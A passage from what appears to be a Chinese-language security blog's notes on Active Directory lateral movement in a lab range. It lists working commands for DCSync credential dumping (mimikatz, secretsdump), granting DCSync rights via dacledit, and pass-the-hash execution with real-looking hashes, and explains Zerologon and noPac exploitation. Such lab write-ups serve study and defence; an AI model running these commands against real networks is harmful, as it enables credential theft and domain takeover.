<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#msf中</span></span><br><span class="line">load kiwi <span class="comment">#加载mimikatz</span></span><br><span class="line">kiwi_cmd <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="comment">#执行一个DCSync攻击模拟，获取administrator的hash</span></span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span> <span class="comment">#使用kail自带的crackmapexec工具进行HASH传递，并登录172.22.1.2在上面执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以用脚本</span></span><br><span class="line">proxychains secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm</span><br></pre></td></tr></table></figure>
<h4 id="writeDacl权限"><a href="#writeDacl权限" class="headerlink" title="writeDacl权限"></a>writeDacl权限</h4><p>具有 WriteDACL 权限, 也可以写 DCSync</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :4de6c4eeee1f315e1241c4a813e2b3b5 -action write -rights DCSync -principal Zhangtong -target-dn <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> -dc-ip 172.22.3.2 <span class="comment">#对Zhangtong用户写 DCSync</span></span><br><span class="line">proxychains python3 secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm <span class="comment">#DCsync攻击获取域控hash</span></span><br><span class="line">proxychains python3 wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2 <span class="comment">#pth</span></span><br></pre></td></tr></table></figure>

<h3 id="其他cve-1"><a href="#其他cve-1" class="headerlink" title="其他cve"></a>其他cve</h3><p>CVE-2020-1472 是继 MS17010 之后一个比较好用的内网提权漏洞，影响Windows Server 2008 R2 至 Windows Server 2019 的多个版本系统，<strong>只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞</strong>。该漏洞不要求当前计算机在域内，也不要求当前计算机操作系统为 windows ，该漏洞的稳定利用方式为<strong>重置目标域控的密码</strong>，然后利用空的控凭证进行 Dc sync 获取域管权限后修复域控密码，之所以不直接使用域控凭证远程执行命令，是因为城控账户是不可以登录的，但是域控具备 DCsync 权限， 可以获取域内任意用户的凭证。</p>
<p>CVE-2021-42278，机器账户的名字一般来说应该以<code>$</code>结尾，但AD没有对域内机器账户名做验证。该漏洞就导致了<strong>第一部分</strong>AS会以签发一个机器名末尾不以<code>$</code>结尾的TGT；因此当后续伪造的用户使用TGT向TGS请求服务票据时TGS是信任TGT内的信息的。</p>
<p>CVE-2021-42287，<strong>在第二部分</strong>，当请求服务 ST 的账户没有被 KDC 找到时，KDC 会自动在尾部添加 <code>$</code> 重新搜索</p>
<p>创建与DC机器账户名字(DC01$)相似的机器账户DC01，账户请求一个TGT后，然后<strong>更名账户为其他名字</strong>，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST</p>
<h2 id="域间横向"><a href="#域间横向" class="headerlink" title="域间横向"></a>域间横向</h2>
        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/server/"># server</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2024/07/21/sql/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">数据库提权</a>
            
            
            <a class="next" rel="next" href="/2024/07/04/sql/nosql%E6%B3%A8%E5%85%A5/">nosql注入</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>